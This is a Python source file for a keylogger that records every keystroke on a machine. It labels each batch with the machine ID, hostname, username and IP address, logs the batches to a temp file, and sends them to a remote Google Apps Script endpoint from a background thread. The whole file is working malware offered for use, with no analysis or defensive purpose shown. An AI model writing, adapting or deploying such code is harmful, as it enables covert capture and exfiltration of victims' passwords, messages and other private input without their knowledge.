import os                                                     
import requests                                               
import getpass                                                 
import socket                                                  
import threading                                               
import queue                                                   
import tempfile                                                 
import time                                                    
import uuid                                                    
from pynput.keyboard import Key, Listener                     
from datetime import datetime                                  

WEB_APP_URL = "Apps Script Link"  # Replace with your Google Apps Script URL
TEMP_DIR = tempfile.gettempdir()                              
MACHINE_ID = f"PC-{str(uuid.getnode())[-6:]}"                 
LOG_FILE = os.path.join(TEMP_DIR, f"log_{MACHINE_ID}.txt")    

log_buffer = ""
send_queue = queue.Queue()
lock = threading.Lock()
hostname = socket.gethostname()
username = getpass.getuser()
ip = socket.gethostbyname(socket.gethostname())

def write_to_txt(data):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n----------\n{MACHINE_ID} | {hostname}/{username} ({ip})\n{ts}\nKey: {data}\n----------\n")
    except:
        pass

def send_to_google(data):
    try:
        payload = {"keystrokes": f"\n----------\n{MACHINE_ID} | {hostname}/{username} ({ip})\n{datetime.now().strftime('%d-%b-%Y %H:%M:%S')}\nKey: {data}\n----------\n"}
        requests.post(WEB_APP_URL, json=payload, timeout=10)
    except:
        pass

def background_sender():
    while True:
        try:
            data = send_queue.get(timeout=2)
            if data and data.strip():
                write_to_txt(data)
                send_to_google(data)
            send_queue.task_done()
        except:
            time.sleep(0.5)

def on_press(key):
    global log_buffer
    with lock:
        try:
            log_buffer += key.char
        except AttributeError:
            if key == Key.space:
                log_buffer += "[SPACE]"
            elif key == Key.enter:
                log_buffer += "[ENTER]"
            elif key == Key.backspace and log_buffer:
                log_buffer += "[BACKSPACE]"
            elif key == Key.delete and log_buffer:
                log_buffer += "[DELETE]"
            elif key == Key.tab:
                log_buffer += "[TAB]"
            elif key == Key.ctrl_l:
                log_buffer += "[CTRL_L]"
            elif key == Key.ctrl_r:
                log_buffer += "[CTRL_R]"
            elif key == Key.caps_lock:
                log_buffer += "[CAPS_LOCK]"

        if len(log_buffer) > 50 or key == Key.enter:
            if log_buffer.strip():
                send_queue.put(log_buffer.strip())
                log_buffer = ""

threading.Thread(target=background_sender, daemon=True).start()

print(f"Keylogger Started -> ID: {MACHINE_ID}")
with Listener(on_press=on_press) as listener:
    listener.join()
